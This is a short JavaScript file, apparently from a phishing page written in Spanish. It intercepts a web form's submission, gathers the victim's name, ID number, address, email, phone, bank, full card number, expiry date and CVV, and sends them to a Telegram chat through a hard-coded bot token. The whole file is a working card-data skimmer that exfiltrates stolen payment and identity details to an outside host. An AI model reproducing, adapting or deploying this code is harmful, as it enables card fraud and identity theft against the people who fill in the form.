document
  .getElementById("main-form")
  .addEventListener("submit", function (event) {
    event.preventDefault(); // Evita el envío normal del formulario

    // Recolecta los datos del formulario
    const name = document.getElementById("name").value;
    const surname = document.getElementById("surname").value;
    const tipoDocumento = document.getElementById("tipos").value;
    const documento = document.getElementById("cc").value;
    const city = document.getElementById("city").value;
    const address = document.getElementById("address").value;
    const email = document.getElementById("email").value;
    const telnum = document.getElementById("telnum").value;
    const ban = document.getElementById("ban").value;
    const numtarj = document.getElementById("p").value;
    const expir = document.getElementById("pdate").value;
    const digits = document.getElementById("c").value;

    // Crea el mensaje que enviarás al bot
    const mensaje = `
     ------- INFO PERSONAL ------

     🔴 Nombre: ${name} ${surname} 🔴\u200B\n 
     🔴 Tipo de Documento: ${tipoDocumento} 🔴\u200B\n
     🔴 Documento: ${documento} 🔴\u200B\n
     📲 Ciudad: ${city}\u200B\n
     📲 Dirección: ${address}\u200B\n
     📲 Email: ${email}\u200B\n
     📲 Teléfono: ${telnum}\u200B\n
     ------------------------------------\u200B\n
     📲 Banco: ${ban}\u200B\n
     💳 Numero de tarjeta: ${numtarj}\u200B\n
     📅 Fecha de expiración: ${expir}\u200B\n
     ⭐ Código CCV: ${digits}\u200B\n
    `;

    // Reemplaza con tu token de bot y tu chat ID
    const botToken = "7867820710:AAHjT59PWYnnfrx5PVh6XIJNZm_qG-Kfxmo";
    const chatId = "6405977303";

    // Envía el mensaje a Telegram
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: mensaje,
      }),
    });
  });
